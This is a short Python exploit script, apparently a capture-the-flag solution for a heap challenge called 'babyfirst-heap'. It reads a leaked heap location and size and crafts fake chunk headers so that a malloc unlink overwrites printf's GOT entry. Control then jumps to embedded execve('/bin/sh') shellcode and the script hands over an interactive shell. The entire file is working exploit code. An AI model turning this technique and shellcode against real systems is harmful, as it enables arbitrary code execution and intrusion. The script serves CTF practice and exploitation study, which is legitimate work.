from zio import *

c_read  = COLORED(RAW, 'blue')
c_write = COLORED(RAW, 'green')
target  = './babyfirst-heap_33ecf0ad56efc1b322088f95dd98827c'

io      = zio(target, print_read = c_read, print_write = c_write, timeout = 10000)
io.gdb_hint([0x8048adb])

def pre():
    io.read_until("Exit function pointer")
    for i in range(0, 11):
        io.read_line()
    io.read_until("loc=")
    loc = int(io.read_until("]")[0:-1], 16)
    io.read_until("size=")
    size = int(io.read_until("]")[0:-1])
    return (loc, size)

shellcode = (
        "\xeb\x06\x90\x90\x90\x90\x90\x90"
        "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31"
        "\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
        )

(loc, size) = pre()

got_printf  = 0x804c004

fake0   =   'A' * (size - 0x4)

fake1   =   l32(size + 0x4) 
fake1   +=  l32((0x10) | 0x1) 
fake1   =   fake1.ljust(0x10, 'A')

fake2   =   l32(0x10) 
fake2   +=  l32(0x80 | 0x1) 
fake2   +=  l32(got_printf - 0x4 * 2)
fake2   +=  l32(loc + size + 0x10 + 0xc)
fake2   +=  shellcode
fake2   =   fake2.ljust(0x80, 'A')

fake3   =   l32(0x80)
fake3   +=  l32(0x41 & 0xfffffff8)

fake    =   fake0 + fake1 + fake2 + fake3

io.writeline(fake)

io.interact()
